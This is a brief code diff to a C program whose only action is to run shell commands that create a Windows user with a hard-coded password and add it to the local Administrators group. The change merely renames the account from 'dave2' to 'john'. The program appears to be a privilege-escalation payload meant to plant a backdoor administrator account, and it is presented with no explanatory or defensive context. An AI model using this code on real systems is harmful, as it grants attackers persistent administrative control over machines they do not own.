@@ -4,8 +4,8 @@ int main ()
 {
   int i;
   
-  i = system ("net user dave2 password123! /add");
-  i = system ("net localgroup administrators dave2 /add");
+  i = system ("net user john Password123! /add");
+  i = system ("net localgroup administrators john /add");
   
   return 0;
 }
